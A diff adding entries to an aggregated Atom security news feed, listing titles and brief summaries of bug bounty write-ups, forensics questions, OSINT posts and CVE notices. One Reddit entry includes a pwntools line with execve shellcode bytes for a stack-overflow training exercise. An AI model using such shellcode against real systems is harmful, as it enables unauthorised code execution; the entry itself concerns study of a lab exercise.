@@ -2,10 +2,562 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://cod3crash.github.io/sec-feed/index.html</id>
     <title>security feed</title>
-    <updated>2022-03-05T01:18:39.657Z</updated>
+    <updated>2022-03-07T01:18:38.014Z</updated>
     <generator>osmosfeed 1.14.4</generator>
     <link rel="alternate" href="https://cod3crash.github.io/sec-feed/index.html"/>
     <link rel="self" href="https://cod3crash.github.io/sec-feed/feed.atom"/>
+    <entry>
+        <title type="html"><![CDATA[March OSINT Musings]]></title>
+        <id>https://medium.com/p/44c679227945</id>
+        <link href="https://medium.com/@mark_15281/march-osint-musings-44c679227945?source=rss------osint-5"/>
+        <updated>2022-03-07T00:58:02.000Z</updated>
+        <summary type="html"><![CDATA[In light of the current events occurring in Ukraine now would be a good time to:
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>OSINT Canada</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Telegram kanallarında arama yapmak için Google hacking’i kullanmak]]></title>
+        <id>https://medium.com/p/33ea619f9a94</id>
+        <link href="https://medium.com/@ghassemiN/telegram-kanallar%C4%B1nda-arama-yapmak-i%C3%A7in-google-hackkingi-kullanmak-33ea619f9a94?source=rss------osint-5"/>
+        <updated>2022-03-06T23:49:03.000Z</updated>
+        <summary type="html"><![CDATA[Telegram’da Putin yanlısı kanallar arıyordum, Google Dork’u kullanma. Bunun da Google hacking’i kullanmanın pratik bir örneği olduğunu…
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>Nasrin</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[help with making money]]></title>
+        <id>https://www.reddit.com/r/AskNetsec/comments/t893tc/help_with_making_money/</id>
+        <link href="https://www.reddit.com/r/AskNetsec/comments/t893tc/help_with_making_money/"/>
+        <updated>2022-03-06T21:38:11.000Z</updated>
+        <summary type="html"><![CDATA[Hey everyone
+ I would like to join the security game. i have a background in programming, how computers and software works
+ what is the fastest way to make money in the security field?
+ I'm here not only for money i really like this field but i need to make money fast i have pills to pay and i can't get a job
+ appreciate any help and guide
+    submitted by    /u/timet0fly  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>AskNetsec</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[AlienVault OSSIM - Step by Step Tuning after Installation]]></title>
+        <id>https://www.reddit.com/r/AskNetsec/comments/t8714c/alienvault_ossim_step_by_step_tuning_after/</id>
+        <link href="https://www.reddit.com/r/AskNetsec/comments/t8714c/alienvault_ossim_step_by_step_tuning_after/"/>
+        <updated>2022-03-06T20:02:07.000Z</updated>
+        <summary type="html"><![CDATA[Hi there,
+ I'm interested to test this SIEM for education purposes. I downloaded the latest version from the official site and installed it on my VMware. 
+ But I stumbled upon the fact that I do not fully understand how best to configure everything. I did not find any deep step-by-step documentation on the official portal.
+ And most likely I can miss a lot through undetailed documentation.
+ Do I understand correctly that Suricata works out of the box? I don't need to install an agent on a Windows host?
+ When I installed HIDS on my Windows host, I had a lot of weird events where the destination IP is displayed - 0.0.0.0. And I don't even know how to make a rule, so these events are not reflected. I googled and other people had such problems and there is no solution. 
+ Who works a lot with this SIEM, perhaps from your experience, you could share recommendations on what to do, what to do after installing this SIEM.
+ I also haven't fully figured out how to run FIM.
+    submitted by    /u/athanielx  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>AskNetsec</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Frelatage: A new Coverage-Based Python fuzzing library]]></title>
+        <id>https://www.reddit.com/r/ExploitDev/comments/t85peb/frelatage_a_new_coveragebased_python_fuzzing/</id>
+        <link href="https://www.reddit.com/r/ExploitDev/comments/t85peb/frelatage_a_new_coveragebased_python_fuzzing/"/>
+        <updated>2022-03-06T19:00:56.000Z</updated>
+        <summary type="html"><![CDATA[Hello everyone !
+ I am a 21 year old french cybersecurity enthusiast and I would like to share with you Frelatage, which is a tool I wrote ! It is a coverage-based Python fuzzing library which can be used to fuzz python code. The development of Frelatage was inspired by various other fuzzers, including AFL/AFL++, Atheris and PyFuzzer.The main purpose of the project is to take advantage of the best features of these fuzzers and gather them together into a new tool in order to efficiently fuzz python applications.
+ Please note that the project is still in early alpha, and its development is very active, so any advice or suggestion is welcomed !
+ Install: https://github.com/Rog3rSm1th/Frelatage
+ https://i.redd.it/m88potyk9tl81.gif
+    submitted by    /u/FrenchFuzzer  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>Exploit Development</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Backdooring WordPress using PyShell]]></title>
+        <id>https://www.reddit.com/r/netsec/comments/t855za/backdooring_wordpress_using_pyshell/</id>
+        <link href="https://www.reddit.com/r/netsec/comments/t855za/backdooring_wordpress_using_pyshell/"/>
+        <updated>2022-03-06T18:36:03.000Z</updated>
+        <summary type="html"><![CDATA[submitted by    /u/jonas02  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>/r/netsec - Information Security News &amp; Discussion</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[10 OSINT Tools Hackers Need to Know About]]></title>
+        <id>https://medium.com/p/9cbb3519ea47</id>
+        <link href="https://0xtmux.medium.com/10-osint-tools-hackers-need-to-know-about-9cbb3519ea47?source=rss------osint-5"/>
+        <updated>2022-03-06T17:42:14.000Z</updated>
+        <summary type="html"><![CDATA[Open source intelligence is a vital task for the red team and blue team alike. Here are some of the most useful OSINT tools.
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>dinesh Kumar</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Going beyond the surface: Vulns that pay well]]></title>
+        <id>https://medium.com/p/8f043abda799</id>
+        <link href="https://infosecwriteups.com/going-beyond-the-surface-vulns-that-pay-well-8f043abda799?source=rss------bugbounty-5"/>
+        <updated>2022-03-06T17:31:26.000Z</updated>
+        <summary type="html"><![CDATA[These days bug bounty hunters have been finding many low hanging fruits and a lot of them want to go beyond those bugs. This blog is for…
+Continue reading on InfoSec Write-ups »]]></summary>
+        <author>
+            <name>Manas Harsh</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Is it possible to be hacked by private networks/hidden SSIDS near your area?]]></title>
+        <id>https://www.reddit.com/r/AskNetsec/comments/t83joj/is_it_possible_to_be_hacked_by_private/</id>
+        <link href="https://www.reddit.com/r/AskNetsec/comments/t83joj/is_it_possible_to_be_hacked_by_private/"/>
+        <updated>2022-03-06T17:23:01.000Z</updated>
+        <summary type="html"><![CDATA[I believe my neighbors are watching me using private networks. I have have an app that shows hidden SSIDs. I think they are using these networks to see and listen to what I'm doing on my devices.
+    submitted by    /u/AshuraSenkuu  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>AskNetsec</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SecWiki News 2022-03-06 Review]]></title>
+        <id>http://www.sec-wiki.com/?2022-03-06</id>
+        <link href="http://www.sec-wiki.com/?2022-03-06"/>
+        <updated>2022-03-06T15:58:20.000Z</updated>
+        <summary type="html"><![CDATA[今日暂未更新资讯~
+更多最新文章，请访问SecWiki]]></summary>
+        <author>
+            <name>SecWiki News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[All About Access Control Part-1]]></title>
+        <id>https://medium.com/p/553c3afbc497</id>
+        <link href="https://medium.com/@mananaggarwal2001/all-about-access-control-part-1-553c3afbc497?source=rss------bugbounty-5"/>
+        <updated>2022-03-06T15:48:01.000Z</updated>
+        <summary type="html"><![CDATA[Hello Myself Manan Aggarwal a student from the BTech CSE is here to Present you the Blog about the All About the Access Control Part-1…
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>Manan Aggarwal</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Send Google Alert To Slack]]></title>
+        <id>https://medium.com/p/31fba2d3cdfb</id>
+        <link href="https://medium.com/@CyberRaya/send-google-alert-to-slack-31fba2d3cdfb?source=rss------osint-5"/>
+        <updated>2022-03-06T14:48:12.000Z</updated>
+        <summary type="html"><![CDATA[Automatic Free Crawler By Google
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>CyberRaya</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Unrecoverable and recoverable windows file]]></title>
+        <id>https://www.reddit.com/r/computerforensics/comments/t7zlim/unrecoverable_and_recoverable_windows_file/</id>
+        <link href="https://www.reddit.com/r/computerforensics/comments/t7zlim/unrecoverable_and_recoverable_windows_file/"/>
+        <updated>2022-03-06T14:13:58.000Z</updated>
+        <summary type="html"><![CDATA[In my forensic image, some deleted files I can recover, some can not. How Encase determine which files are not recoverable internally? For data carving, how Encase retrieve internally those files, are they use same techniques compared with recover deleted files? thanks.
+    submitted by    /u/cyberfo  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>Computer Forensics</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[X-ways linux image analysis]]></title>
+        <id>https://www.reddit.com/r/computerforensics/comments/t7zdqy/xways_linux_image_analysis/</id>
+        <link href="https://www.reddit.com/r/computerforensics/comments/t7zdqy/xways_linux_image_analysis/"/>
+        <updated>2022-03-06T14:03:08.000Z</updated>
+        <summary type="html"><![CDATA[in X-ways, if I browse the root directory of image, i found free space, idle space and slack space, can anyone explain what's the different among these these three spaces?
+ in filter attribute， there are SUID/SGID, symlink and special file. I thought suid file are special file, what are the special file X-ways refer to ? symlink means hardlink or soft link?
+    submitted by    /u/cyberfo  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>Computer Forensics</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[A short story of IDOR for your perspective]]></title>
+        <id>https://medium.com/p/c1e7580213b9</id>
+        <link href="https://medium.com/@gguzelkokar.mdbf15/a-short-story-of-idor-for-your-perspective-c1e7580213b9?source=rss------bugbounty-5"/>
+        <updated>2022-03-06T13:13:24.000Z</updated>
+        <summary type="html"><![CDATA[Hi all, I hope all is well. In this story, I’ll explain an idor bug which I found in a private bug bounty program. This story will very…
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>Gökhan Güzelkokar</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Evading Network Defense with Protocol Manipulation]]></title>
+        <id>https://medium.com/p/eeda3e13e2a0</id>
+        <link href="https://r4bb1t.medium.com/evading-network-defense-with-protocol-manipulation-eeda3e13e2a0?source=rss------redteam-5"/>
+        <updated>2022-03-06T12:54:21.000Z</updated>
+        <summary type="html"><![CDATA[Signature based intrusion detection or prevention systems, will detect malicious activity through a predefined signature. If a Red Team…
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>Rabbit</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2022-25312: An XML external entity (XXE) injection vulnerability exists I]]></title>
+        <id>https://news.ycombinator.com/item?id=30577267</id>
+        <link href="https://lists.apache.org/list?announce@apache.org:2022-3"/>
+        <updated>2022-03-06T12:53:38.000Z</updated>
+        <summary type="html"><![CDATA[Article URL: https://lists.apache.org/list?announce@apache.org:2022-3
+Comments URL: https://news.ycombinator.com/item?id=30577267
+Points: 3
+# Comments: 0]]></summary>
+        <author>
+            <name>based2</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2022-25312: An XML external entity (XXE) injection vulnerability exists I]]></title>
+        <id>https://news.ycombinator.com/item?id=30577267</id>
+        <link href="https://lists.apache.org/list?announce@apache.org:2022-3"/>
+        <updated>2022-03-06T12:53:38.000Z</updated>
+        <summary type="html"><![CDATA[Article URL: https://lists.apache.org/list?announce@apache.org:2022-3
+Comments URL: https://news.ycombinator.com/item?id=30577267
+Points: 3
+# Comments: 0]]></summary>
+        <author>
+            <name>based2</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[The (Mis)Use of Artifact Categories, pt II]]></title>
+        <id>tag:blogger.com,1999:blog-9518042.post-162465406769525469</id>
+        <link href="http://windowsir.blogspot.com/2022/03/the-misuse-of-artifact-categories-pt-ii.html"/>
+        <updated>2022-03-06T12:50:00.000Z</updated>
+        <summary type="html"><![CDATA[My previous post on this topic presented my thoughts on how the concept of "artifact categories" were being misused.
+My engagement with artifact categories goes back to 2013, when Corey Harrell implemented his thoughts on categories via auto_rip. I saw, and continue to see, the value in identifying artifact categories, but as I alluded to in my previous post, it really seems that the categories are being misused. Where the artifacts should be viewed as providing an indication of the categories and requiring further analysis (including, but not limited to the population of artifact constellations), instead, the artifacts are often misinterpreted as being emphatic statements of the event or condition occurring. For example, while an entry in the ShimCache or AmCache.hve file should indicate …]]></summary>
+        <author>
+            <name>noreply@blogger.com (Unknown)</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SSRFire - an automated SSRF finder]]></title>
+        <id>https://medium.com/p/c6313b113f5</id>
+        <link href="https://medium.com/@thenurhabib/ssrfire-an-automated-ssrf-finder-c6313b113f5?source=rss------bugbounty-5"/>
+        <updated>2022-03-06T12:48:35.000Z</updated>
+        <summary type="html"><![CDATA[An automated SSRF finder. Just give the domain name and your server and chill! ;) It also has options to find XSS and open redirects.
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>Md. Nur Habib</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[DFIR Reporting]]></title>
+        <id>tag:blogger.com,1999:blog-9518042.post-6884963457139744928</id>
+        <link href="http://windowsir.blogspot.com/2022/03/dfir-reporting.html"/>
+        <updated>2022-03-06T12:41:00.000Z</updated>
+        <summary type="html"><![CDATA[A request that's been pretty consistent within the industry over time has had to do with reporting. I'd see a request, some responses, someone might ask for a template, and then the exchange would die off...I assumed that it had moved to DMs or offline. Then you'd see the discussion pop up again later, in some other forum.
+I get it...writing is hard. I have the benefit of having had to write throughout my career, but also of putting intentional, dedicated effort into DFIR reporting, in that I had been very purposeful in seeking feedback from my boss, and incorporating that feedback into report writing. I was able to get to the point of having reports approved with minimal (if any) changes pretty quickly. 
+As a result, in 2014, Windows Forensic Analysis Toolkit 4/e was published, and in thi…]]></summary>
+        <author>
+            <name>noreply@blogger.com (Unknown)</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[PSA: reddit appears to be removing posts/comments containing *.ru URLs]]></title>
+        <id>https://www.reddit.com/r/opendirectories/comments/t7xp02/psa_reddit_appears_to_be_removing_postscomments/</id>
+        <link href="https://www.reddit.com/r/opendirectories/comments/t7xp02/psa_reddit_appears_to_be_removing_postscomments/"/>
+        <updated>2022-03-06T12:24:07.000Z</updated>
+        <summary type="html"><![CDATA[submitted by    /u/PM_ME_TO_PLAY_A_GAME  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>Open Directories</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[WhatsApp Bug Bounty: Bypassing biometric authentication using voip]]></title>
+        <id>https://medium.com/p/87548ef7a0ba</id>
+        <link href="https://infosecwriteups.com/whatsapp-bug-bounty-bypassing-biometric-authentication-using-voip-87548ef7a0ba?source=rss------bugbounty-5"/>
+        <updated>2022-03-06T11:58:23.000Z</updated>
+        <summary type="html"><![CDATA[Bypassing biometric authentication just by making a call and access the app completely
+Continue reading on InfoSec Write-ups »]]></summary>
+        <author>
+            <name>Arvind</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Potential drive-by 0-click 0-day on chrome]]></title>
+        <id>https://www.reddit.com/r/AskNetsec/comments/t7vt2g/potential_driveby_0click_0day_on_chrome/</id>
+        <link href="https://www.reddit.com/r/AskNetsec/comments/t7vt2g/potential_driveby_0click_0day_on_chrome/"/>
+        <updated>2022-03-06T10:08:17.000Z</updated>
+        <summary type="html"><![CDATA[There is an on going bug in chrome that allows attackers to download files in the background into the victims machine without triggering any gui updates, I first experienced this about two moths ago when I was trying to close the browser only to be interrupted by a chrome prompt informing me that there are ongoing downloads in the background that weren't started by me and display no sign of the downloading process on chrome's gui. I was a bit alarmed but I didn't pay it too much attention.
+ Then I got curious when yesterday I had the same experience again, this time obviously I clicked 'continue downloads', I was taken to chrome download page where I found that chrome had intercepted and flagged a 'malicious file' and it was offering me to either 'keep' or 'discard' said file, regrettably …]]></summary>
+        <author>
+            <name>AskNetsec</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Escaping privileged containers for fun.]]></title>
+        <id>https://www.reddit.com/r/netsec/comments/t7vm66/escaping_privileged_containers_for_fun/</id>
+        <link href="https://www.reddit.com/r/netsec/comments/t7vm66/escaping_privileged_containers_for_fun/"/>
+        <updated>2022-03-06T09:55:13.000Z</updated>
+        <summary type="html"><![CDATA[submitted by    /u/JordyZomer  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>/r/netsec - Information Security News &amp; Discussion</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[HOF In 3 Minute Using Low Hanging Fruits]]></title>
+        <id>https://medium.com/p/81f4f855ebb7</id>
+        <link href="https://akash0x0.medium.com/hof-in-3-minute-using-low-hanging-fruits-81f4f855ebb7?source=rss------bugbounty-5"/>
+        <updated>2022-03-06T08:52:00.000Z</updated>
+        <summary type="html"><![CDATA[Hello, Security Guys & Hacker In this Write Up I am Going to tell you about
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>Akash0x0</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Response Manipulation leads to Account Takeover]]></title>
+        <id>https://medium.com/p/e1a250acb003</id>
+        <link href="https://medium.com/techiepedia/response-manipulation-leads-to-account-takeover-e1a250acb003?source=rss------bugbounty-5"/>
+        <updated>2022-03-06T07:47:54.000Z</updated>
+        <summary type="html"><![CDATA[This is a short story about my recent bug hunting on a private program. This program mainly relies on OTP to check user’s authentication…
+Continue reading on Techiepedia »]]></summary>
+        <author>
+            <name>MikeChan</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Weak Registration Implementation]]></title>
+        <id>https://medium.com/p/64c94c702a7c</id>
+        <link href="https://medium.com/@sathvika03/weak-registration-implementation-64c94c702a7c?source=rss------bugbounty-5"/>
+        <updated>2022-03-06T03:53:43.000Z</updated>
+        <summary type="html"><![CDATA[Let us learn some P4 bugs
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>Hackt3r</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Shellcode Buff Overflow Question]]></title>
+        <id>https://www.reddit.com/r/ExploitDev/comments/t7qa3f/shellcode_buff_overflow_question/</id>
+        <link href="https://www.reddit.com/r/ExploitDev/comments/t7qa3f/shellcode_buff_overflow_question/"/>
+        <updated>2022-03-06T03:45:54.000Z</updated>
+        <summary type="html"><![CDATA[As I was going through protostar Phoenix Stack overflows I came across something on the Stack-Five exercise that I don't quite understand on amd64. https://exploit.education/phoenix/stack-five/
+ Basically I can get the exploit to work when the nop sled is 80 characters long but when I have it 88 characters long I get a seg fault.
+ This Works
+ t.sendline('\x90'*80 + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'h'*29 + pwn.p64(0x7fffffffe5d0))
+ ​
+ This gives a segfault
+ t.sendline('\x90'*88 + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'h'*21 + pwn.p64(0x7fffffffe5d0))
+ ​
+ Does anyone know why the second one doesn't work?
+    submitted by    /u/Jasonsaccount  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>Exploit Development</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Final Recon — OSINT Tool for All-In-One Web Reconnaissance]]></title>
+        <id>https://medium.com/p/3aa7ac49f9ba</id>
+        <link href="https://medium.com/@mancusomjm/final-recon-osint-tool-for-all-in-one-web-reconnaissance-3aa7ac49f9ba?source=rss------osint-5"/>
+        <updated>2022-03-06T03:08:19.000Z</updated>
+        <summary type="html"><![CDATA[Final Recon is a fast and simple python script for web reconnaissance. It follows a modular structure so in future new modules can be…
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>Michael Mancuso</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Big Collection of 720p Movies, solid speeds, haven't explored all the directories, so I'm marking NSFW just in case.]]></title>
+        <id>https://www.reddit.com/r/opendirectories/comments/t7it62/big_collection_of_720p_movies_solid_speeds_havent/</id>
+        <link href="https://www.reddit.com/r/opendirectories/comments/t7it62/big_collection_of_720p_movies_solid_speeds_havent/"/>
+        <updated>2022-03-05T21:03:32.000Z</updated>
+        <summary type="html"><![CDATA[submitted by    /u/SatansMoisture  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>Open Directories</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Classic TV: Various video qualities, decent speeds]]></title>
+        <id>https://www.reddit.com/r/opendirectories/comments/t7ikgo/classic_tv_various_video_qualities_decent_speeds/</id>
+        <link href="https://www.reddit.com/r/opendirectories/comments/t7ikgo/classic_tv_various_video_qualities_decent_speeds/"/>
+        <updated>2022-03-05T20:51:43.000Z</updated>
+        <summary type="html"><![CDATA[submitted by    /u/SatansMoisture  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>Open Directories</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[A Detailed Guide on Wfuzz]]></title>
+        <id>https://www.hackingarticles.in/?p=27813</id>
+        <link href="https://www.hackingarticles.in/a-detailed-guide-on-wfuzz/"/>
+        <updated>2022-03-05T18:16:26.000Z</updated>
+        <summary type="html"><![CDATA[Introduction Many tools have been developed that create an HTTP request and allow a user to modify their contents. Fuzzing works the same way. A
+The post A Detailed Guide on Wfuzz appeared first on Hacking Articles.]]></summary>
+        <author>
+            <name>Raj Chandel</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[webOS Revisited - Even More Mistaken Identities · The Recurity Lablog]]></title>
+        <id>https://www.reddit.com/r/netsec/comments/t7evgy/webos_revisited_even_more_mistaken_identities_the/</id>
+        <link href="https://www.reddit.com/r/netsec/comments/t7evgy/webos_revisited_even_more_mistaken_identities_the/"/>
+        <updated>2022-03-05T17:53:42.000Z</updated>
+        <summary type="html"><![CDATA[submitted by    /u/addelindh  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>/r/netsec - Information Security News &amp; Discussion</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Question about protecting my data while traveling .]]></title>
+        <id>https://www.reddit.com/r/AskNetsec/comments/t7erm4/question_about_protecting_my_data_while_traveling/</id>
+        <link href="https://www.reddit.com/r/AskNetsec/comments/t7erm4/question_about_protecting_my_data_while_traveling/"/>
+        <updated>2022-03-05T17:48:35.000Z</updated>
+        <summary type="html"><![CDATA[Traveling a lot this week and was just wondering what kind of vpn you guys use while traveling and any other security measures you may have :)
+    submitted by    /u/Savage-shredder  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>AskNetsec</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Cloudflare WAF bypass via Origin IP]]></title>
+        <id>https://medium.com/p/d456705693c7</id>
+        <link href="https://navdeepkhubber.medium.com/cloudflare-waf-bypass-via-origin-ip-d456705693c7?source=rss------bugbounty-5"/>
+        <updated>2022-03-05T16:29:20.000Z</updated>
+        <summary type="html"><![CDATA[Cloudflare supports more than 16 million Internet attributes and is now one of the most popular WAFs(Web Application Firewalls). A year…
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>Navdeep Khubber</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SecWiki News 2022-03-05 Review]]></title>
+        <id>http://www.sec-wiki.com/?2022-03-05</id>
+        <link href="http://www.sec-wiki.com/?2022-03-05"/>
+        <updated>2022-03-05T15:58:20.000Z</updated>
+        <summary type="html"><![CDATA[高效挖掘反序列化漏洞——GadgetInspector改造  by ourren
+js安全之ast混淆   by ourren
+基于openresty的安全网关开发记录  by ourren
+更多最新文章，请访问SecWiki]]></summary>
+        <author>
+            <name>SecWiki News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[How to collect a forensic image of a VSXI/EXSI that has been infected with ransomware?]]></title>
+        <id>https://www.reddit.com/r/computerforensics/comments/t7bov7/how_to_collect_a_forensic_image_of_a_vsxiexsi/</id>
+        <link href="https://www.reddit.com/r/computerforensics/comments/t7bov7/how_to_collect_a_forensic_image_of_a_vsxiexsi/"/>
+        <updated>2022-03-05T15:23:58.000Z</updated>
+        <summary type="html"><![CDATA[How to collect a forensic image of a VSXI/EXSI that has been infected with ransomware?
+    submitted by    /u/rvndomus3r2019  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>Computer Forensics</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Bug Bounty: Open Xmlrpc.php vulnerability on WordPress site.]]></title>
+        <id>https://medium.com/p/723361febfaf</id>
+        <link href="https://medium.com/@Hacker_Yogi/bug-bounty-open-xmlrpc-php-vulnerability-on-wordpress-site-723361febfaf?source=rss------bugbounty-5"/>
+        <updated>2022-03-05T15:00:59.000Z</updated>
+        <summary type="html"><![CDATA[what is Xml-RPC?
+Continue reading on Medium »]]></summary>
+        <author>
+            <name>Ruben (Hacker_Yogi)</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Copying Hard Drive]]></title>
+        <id>https://www.reddit.com/r/computerforensics/comments/t79kxb/copying_hard_drive/</id>
+        <link href="https://www.reddit.com/r/computerforensics/comments/t79kxb/copying_hard_drive/"/>
+        <updated>2022-03-05T13:35:33.000Z</updated>
+        <summary type="html"><![CDATA[I am sending a hard drive I own into Cyber Forensics. If possible, I am looking for software advice to copy the hard drive before sending it in to experts. Additionally, if you have advice for transferring the files from the software to a type of hardware, I would appreciate it. 
+ ​
+ Thanks.
+    submitted by    /u/Odd-Switch-1658  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>Computer Forensics</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Good US based infosec recruiters?]]></title>
+        <id>https://www.reddit.com/r/AskNetsec/comments/t784qc/good_us_based_infosec_recruiters/</id>
+        <link href="https://www.reddit.com/r/AskNetsec/comments/t784qc/good_us_based_infosec_recruiters/"/>
+        <updated>2022-03-05T12:06:59.000Z</updated>
+        <summary type="html"><![CDATA[I never thought I would say this, normally being on the hiring side, but has anyone had positive experience for US-based boutique infosec recruiters that they would recommend? I’ve found several listed in CISO magazine and such but don’t know if any are particularly clue-full. Public or DM is fine, thanks!
+    submitted by    /u/venerable4bede  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>AskNetsec</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[UK’s vulnerability to corruption uncovered amid slow sanctions response]]></title>
+        <id>https://news.ycombinator.com/item?id=30566774</id>
+        <link href="https://www.theguardian.com/commentisfree/2022/mar/05/uks-vulnerability-to-corruption-uncovered-amid-slow-sanctions-response"/>
+        <updated>2022-03-05T12:04:58.000Z</updated>
+        <summary type="html"><![CDATA[Article URL: https://www.theguardian.com/commentisfree/2022/mar/05/uks-vulnerability-to-corruption-uncovered-amid-slow-sanctions-response
+Comments URL: https://news.ycombinator.com/item?id=30566774
+Points: 9
+# Comments: 0]]></summary>
+        <author>
+            <name>belter</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Plugins for Persistence (Sublime Text & VS Code)]]></title>
+        <id>https://www.reddit.com/r/redteamsec/comments/t77irh/plugins_for_persistence_sublime_text_vs_code/</id>
+        <link href="https://www.reddit.com/r/redteamsec/comments/t77irh/plugins_for_persistence_sublime_text_vs_code/"/>
+        <updated>2022-03-05T11:25:58.000Z</updated>
+        <summary type="html"><![CDATA[submitted by    /u/hanbei-undying  
+ [link]   [comments]]]></summary>
+        <author>
+            <name>Red Team Security</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[unclaimed subdomain special.rkeeper.ru  to takeover from tilda.cc]]></title>
+        <id>https://hackerone.com/reports/1045644</id>
+        <link href="https://hackerone.com/reports/1045644"/>
+        <updated>2022-03-05T08:15:50.000Z</updated>
+        <summary type="html"><![CDATA[Mail.ru disclosed a bug submitted by mainteemoforfun: https://hackerone.com/reports/1045644]]></summary>
+        <author>
+            <name>The unofficial HackerOne disclosure timeline</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[FreeBuf早报 | 英伟达71000名员工凭证泄露 ；政协委员建议设立网络安全和数据保护窗口]]></title>
+        <id>https://www.freebuf.com/news/323908.html</id>
+        <link href="https://www.freebuf.com/news/323908.html"/>
+        <updated>2022-03-05T08:10:42.000Z</updated>
+        <summary type="html"><![CDATA[英伟达发布了一份报告，承认攻击者从其系统中窃取了员工密码和未披露的英伟达专有信息。]]></summary>
+        <author>
+            <name>FreeBuf网络安全行业门户</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Expat library: libexpat 2.4.7 (CVE fixes)]]></title>
+        <id>https://news.ycombinator.com/item?id=30564782</id>
+        <link href="https://github.com/libexpat/libexpat/blob/R_2_4_7/expat/Changes"/>
+        <updated>2022-03-05T06:04:28.000Z</updated>
+        <summary type="html"><![CDATA[Article URL: https://github.com/libexpat/libexpat/blob/R_2_4_7/expat/Changes
+Comments URL: https://news.ycombinator.com/item?id=30564782
+Points: 1
+# Comments: 0]]></summary>
+        <author>
+            <name>neustradamus</name>
+        </author>
+    </entry>
     <entry>
